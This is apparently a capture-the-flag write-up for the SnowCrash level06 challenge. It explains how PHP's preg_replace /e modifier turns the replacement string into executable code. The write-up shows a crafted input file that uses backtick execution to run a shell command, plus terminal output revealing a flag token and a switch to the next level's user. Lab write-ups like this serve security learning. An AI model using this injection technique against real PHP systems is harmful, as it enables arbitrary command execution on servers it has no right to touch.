Level06 instructions

After analyzing the code we can see that there is an exploitation in the function `preg_replace` with the modifier `\e`
The `/e` modifier evaluates the replacement string as PHP code

https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php
https://www.exploit-db.com/exploits/23448
https://www.php.net/manual/en/language.operators.execution.php

Let's exploit this line
```
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
```
We need to to add a PHP executable code after `[x`
```
level06@SnowCrash:~$ echo '[x {${phpinfo()}}]' > /tmp/exploit.txt
level06@SnowCrash:~$ ./level06 /tmp/exploit.txt
level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/exploit.txt
level06@SnowCrash:~$ ./level06 /tmp/exploit.txt
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
evel06@SnowCrash:~$ su level07
Password:
level07@SnowCrash:~$
```

